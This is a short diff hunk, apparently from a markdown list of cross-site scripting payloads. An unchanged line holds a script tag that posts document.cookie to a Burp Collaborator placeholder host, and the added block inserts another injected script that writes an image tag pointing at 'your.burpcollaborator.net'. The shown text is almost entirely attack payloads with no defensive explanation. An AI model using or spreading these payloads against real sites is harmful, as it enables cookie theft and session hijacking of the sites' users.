@@ -1140,6 +1140,10 @@ python3 -m http.server -m 80
 ```
 </script> <script>fetch('https://<Collaborator>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>//
 ```
+
+```
+"><script>document.write(%27<img%20src="your.burpcollaborator.net/);</script>
+```
 -
 >bypass add
 ```
